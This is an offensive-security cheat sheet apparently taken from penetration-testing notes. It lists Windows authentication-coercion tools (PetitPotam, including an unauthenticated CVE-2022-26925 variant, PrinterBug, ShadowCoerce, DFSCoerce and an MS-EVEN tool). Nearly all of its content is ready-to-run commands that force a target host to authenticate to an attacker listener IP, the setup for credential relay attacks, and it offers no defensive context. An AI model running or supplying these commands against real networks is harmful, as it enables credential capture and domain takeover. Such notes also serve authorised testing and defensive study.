# Coerce

## Tools: PetitPotam , Unathenticated PetitPotam (CVE-2022-26925)

## Commands:

 - PetitPotam.py -d DOMAIN LISTENER_IP TARGET_IP

### Go to MITM section for further usage

##### PetitPotam

    ./PetitPotam.exe attacker_IP target_IP

##### PrinterBug

    ./SpoolSample.exe target_IP attacker_IP

##### ShadowCoerce

    python3.exe shadowcoerce.py -d domain.local -u user1 -p password attacker_IP target_IP

##### DFSCoerce

    python3.exe dfscoerce.py -u user1 -d domain.local <listener_IP> <target_IP>

##### CheeseOunce via MS-EVEN

    ./MS-EVEN.exe <listener_IP> <target_IP>
